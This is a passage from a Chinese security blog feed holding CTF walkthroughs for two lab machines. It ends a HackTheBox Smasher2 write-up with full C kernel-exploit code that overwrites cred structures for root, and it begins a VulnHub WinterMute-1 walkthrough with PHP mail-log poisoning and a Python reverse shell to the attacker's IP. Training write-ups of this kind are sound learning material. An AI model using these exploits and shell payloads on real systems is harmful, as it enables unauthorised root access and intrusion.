&#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">            credIt = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getuid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(<span class="string">&quot;[+] GOT ROOT!&quot;</span>);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                credIt = 0;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，编译并运行，并且可以成为root用户，这意味着它可以正常工作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp3.c -o exp3</span><br><span class="line">exp3.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp3.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp3</span><br><span class="line">[+] PID: 2008</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99444, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a995c4, credNum: 5</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99c84, credNum: 6</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6184, credNum: 7</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6484, credNum: 8</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6544, credNum: 9</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6b44, credNum: 10</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6c04, credNum: 11</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6d84, credNum: 12</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7144, credNum: 13</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7204, credNum: 14</span><br><span class="line">[+] GOT ROOT!</span><br><span class="line">[+] Scanning loop END</span><br></pre></td></tr></table></figure>
<p>在等待getchar（）时，可以检查该进程的状态，并查看它以root身份运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat /proc/2008/status</span><br><span class="line">Name:   exp3</span><br><span class="line">Umask:  0002</span><br><span class="line">State:  S (sleeping)</span><br><span class="line">Tgid:   2008</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    2008</span><br><span class="line">PPid:   1833</span><br><span class="line">TracerPid:      0</span><br><span class="line">Uid:    0       0       0       0     &lt;-- root</span><br><span class="line">Gid:    0       0       0       0     &lt;-- root group</span><br><span class="line">FDSize: 256</span><br><span class="line">Groups: 4 24 30 46 111 112 1000 </span><br><span class="line">NStgid: 2008</span><br><span class="line">NSpid:  2008</span><br><span class="line">NSpgid: 2008</span><br><span class="line">NSsid:  1833</span><br><span class="line">VmPeak:  3936672 kB</span><br><span class="line">VmSize:  3936672 kB</span><br><span class="line">VmLck:         0 kB</span><br><span class="line">VmPin:         0 kB</span><br><span class="line">VmHWM:       792 kB</span><br><span class="line">VmRSS:       792 kB</span><br><span class="line">RssAnon:              64 kB</span><br><span class="line">RssFile:             720 kB</span><br><span class="line">RssShmem:              8 kB</span><br><span class="line">VmData:      176 kB</span><br><span class="line">VmStk:       132 kB</span><br><span class="line">VmExe:         8 kB</span><br><span class="line">VmLib:      2112 kB</span><br><span class="line">VmPTE:      7760 kB</span><br><span class="line">VmSwap:        0 kB</span><br><span class="line">HugetlbPages:          0 kB</span><br><span class="line">CoreDumping:    0</span><br><span class="line">Threads:        1</span><br><span class="line">SigQ:   0/7400</span><br><span class="line">SigPnd: 0000000000000000</span><br><span class="line">ShdPnd: 0000000000000000</span><br><span class="line">SigBlk: 0000000000000000</span><br><span class="line">SigIgn: 0000000000000000</span><br><span class="line">SigCgt: 0000000000000000</span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000000000000000</span><br><span class="line">CapEff: 0000000000000000</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line">NoNewPrivs:     0</span><br><span class="line">Seccomp:        0</span><br><span class="line">Speculation_Store_Bypass:       thread vulnerable</span><br><span class="line">Cpus_allowed:   ffffffff,ffffffff,ffffffff,ffffffff</span><br><span class="line">Cpus_allowed_list:      0-127</span><br><span class="line">Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001</span><br><span class="line">Mems_allowed_list:      0</span><br><span class="line">voluntary_ctxt_switches:        1</span><br><span class="line">nonvoluntary_ctxt_switches:     96</span><br></pre></td></tr></table></figure>

<ul>
<li>get root</li>
</ul>
<p>现在，我将其升级以获得shell。 只需要添加将功能设置为全1的代码，然后执行一个shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UID: %d\n&quot;</span>, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = 0;</span><br><span class="line">    unsigned int credNum = 0;</span><br><span class="line">    <span class="keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size -0x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">            credIt = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getuid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(<span class="string">&quot;[+] GOT ROOT!&quot;</span>);</span><br><span class="line"></span><br><span class="line">                credIt += 1; //skip 4 bytes to get to caps</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line"></span><br><span class="line">                execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-&quot;</span>, (char *)NULL);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                credIt = 0;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在像以前一样编译，然后运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp4.c -o exp4</span><br><span class="line">exp4.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp4.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp4</span><br><span class="line">[+] PID: 2019</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a98844, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99204, credNum: 5</span><br><span class="line">[+] GOT ROOT!</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功获取root权限，现在读取flag并提交,帅到飞天。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">CREDITS.txt  root.txt</span><br><span class="line"><span class="comment"># cat CREDITS.txt</span></span><br><span class="line">SMASHER2 by dzonerzy@htb <span class="keyword">in</span> collaboration with xg0@htb have fun and be ready <span class="keyword">for</span> smasher3!</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">7791e0e************************</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb11.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb12.jpg"></p>
<p>知识点总结：</p>
<ul>
<li>身份验证绕过</li>
<li>RCE与WAF绕过</li>
<li>不安全mmap程序实现的内核模块(该模块允许用户访问内核内存)</li>
</ul>
<p>最后演示一下性感大佬在线删除靶机，删自己的靶机，让别人无靶机可打，小盆友请勿模仿，太黄太暴力过程就不演示了！！！;)</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb13.jpg"></p>
<p>嗯，，，已经删到残废了。。。</p>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[WinterMute-1]</title>
    <url>/2020/01/13/WinterMute-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：WinterMute：1<br>发布日期：2018年7月5日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MWJIZ2R4MGlJMjRqdjdNRHpLY3JJUHRkOXJWRmFWb2tS">https://drive.google.com/open?id=1bHgdx0iI24jv7MDzKcrIPtd9rVFaVokR<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93aW50ZXJtdXRlL1dpbnRlcm11dGUtdjEuemlw">https://download.vulnhub.com/wintermute/Wintermute-v1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93aW50ZXJtdXRlL1dpbnRlcm11dGUtdjEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/wintermute/Wintermute-v1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>一个新的OSCP风格实验室，涉及2台易受攻击的机器，以赛博朋克经典Neuromancer为主题-任何网络安全爱好者都必须阅读。该实验室利用了数据透视和后期开发，而我发现其他OSCP预处理实验室似乎缺乏。目标是在两台计算机上都root。您只需要默认的Kali Linux。</p>
<p>我将其评为“中级”。没有缓冲区溢出或漏洞利用开发-可以使用小的字典进行任何必要的密码破解。它与OSCP盒而不是CTF更为相关。我已经测试了很多，但是如果您发现任何问题或需要在这里微调我。</p>
<p>压缩下载中包含Virtual Box Lab的安装说明，但是这里有一个简短的摘要：Straylight-模拟带有2个NICS的面向公众的服务器。首先盖上此盖，然后转到最后一台机器。Neuromancer-在具有1个NIC的非公共网络中。您的Kali框应仅与Straylight位于同一虚拟网络上。需要VirtualBox。VMware无法正确导入。</p>
<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>Wintermute Vitrual Box设置指南本练习利用了数据透视，因此需要正确设置VirtualBox网络。所有动态ip都快速简便。运行或将每台计算机导入Virtual Box（文件&gt;&gt;导入设备）</p>
<p>STRAYLIGHT（网络＃1和＃2）-这是第一台获得root权限的计算机。</p>
<ul>
<li>Adapter 1 <ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #1<br>Advanced (we want 2 NIC’s, each on a separate network)</li>
<li>Adapter Type - Intel PRO/1000 T Server </li>
</ul>
</li>
<li>Adapter 2<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #2<br>Advanced</li>
<li>Adapter Type - Intel PRO/1000 MT Desktop (or other adapter type different than network #1).</li>
</ul>
</li>
</ul>
<p>NEUROMANCER（网络2）-这是获得root的最终机器。设置为具有1个网络。仅通过Straylight使用仅限主机的Eth适配器＃2访问。</p>
<ul>
<li>Adapter 1<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #2<br>Advanced</li>
<li>Adapter Type - Intel PRO/1000 MT Desktop</li>
</ul>
</li>
</ul>
<p>KALI（网络＃1）-您的攻击机器仅应在仅主机的适配器上设置，Straylight处于打开状态，如果选择，则为NAT。-您不应该从Kali盒中对Neuromancer进行ping操作。如果可以的话，你在作弊。</p>
<ul>
<li>Adapter 1<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #1</li>
</ul>
</li>
</ul>
<p><img src="https://www.baslub.nl/wp-content/uploads/2019/01/Network-setup-768x332.png"></p>
<p>网络这样设置以便于通关了STRAYLIGHT之后，再通关NEUROMANCER</p>
<h4 id="Wintermute-Straylight"><a href="#Wintermute-Straylight" class="headerlink" title="Wintermute-Straylight"></a>Wintermute-Straylight</h4><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.111</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 08:00:27:50:96:D9 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -T5 -v -A --script=vuln 192.168.56.111</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">25/tcp   open  smtp    Postfix smtpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 2048</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 2048</span><br><span class="line">|     References:</span><br><span class="line">|_      https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /manual/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">3000/tcp open  http    Mongoose httpd</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.111</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.111:3000/</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|_    Form action: /authorize.html</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|_    Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">| http-vuln-cve2010-0738: </span></span><br><span class="line"><span class="string">|_  /jmx-console/: Authentication was not required</span></span><br></pre></td></tr></table></figure>

<p>访问80端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub156.jpg"></p>
<p>访问3000端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub157.jpg"></p>
<p>发现下方有提示说用户密码都是admin，然后直接登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hint: the default user and password are admin</span><br></pre></td></tr></table></figure>
<p>发现有一些目录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub158.jpg"></p>
<p>然后访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTExL3R1cmluZy1ib2xvLw==">http://192.168.56.111/turing-bolo/<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub159.jpg"></p>
<p>点击之后显示如下</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub160.jpg"></p>
<p>从上面的屏幕截图中，可以看到一些日志文件（突出显示）。根据经验，目录遍历，可以在浏览器中执行可写文件。因此，尝试将../../../log/mail附加到浏览器中的URL，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=../../../<span class="built_in">log</span>/mail</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub161.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub162.jpg"></p>
<p>使用下面的url也可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/<span class="built_in">log</span>/mail</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>有用。现在，让尝试使用telnet发送恶意邮件。在邮件主题中包括一些php代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># telnet 192.168.56.111 25</span></span><br><span class="line">Trying 192.168.56.111...</span><br><span class="line">Connected to 192.168.56.111.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">220 straylight ESMTP Postfix (Debian/GNU)</span><br><span class="line">HELO hack.com</span><br><span class="line">250 straylight</span><br><span class="line">MAIL FROM: hacker@hack.com</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO: wintermute@localhost.com</span><br><span class="line">454 4.7.1 &lt;wintermute@localhost.com&gt;: Relay access denied</span><br><span class="line">RCPT TO: wintermute</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">DATA</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">subject: &lt;?php system(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;luci&#x27;</span>]); ?&gt;</span><br><span class="line">hacked!!</span><br><span class="line">.</span><br><span class="line">250 2.0.0 Ok: queued as EC8E454D7</span><br><span class="line">quit</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>现在再次包含mail.log文件，但是这次发送第二个GET参数luci，该参数将执行我们的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/<span class="built_in">log</span>/mail&amp;luci=id</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub163.jpg"></p>
<p>可以看到成功执行命令，现在构造以下的poc以获得一个reverse shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.111/turing-bolo/bolo.php?bolo=/var/<span class="built_in">log</span>/mail&amp;luci=python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.56.102&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>
<p>可以看到kali端成功弹回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9999</span></span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">192.168.56.109: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.109] 48508</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (771): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">www-data@straylight:/var/www/html/turing-bolo$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
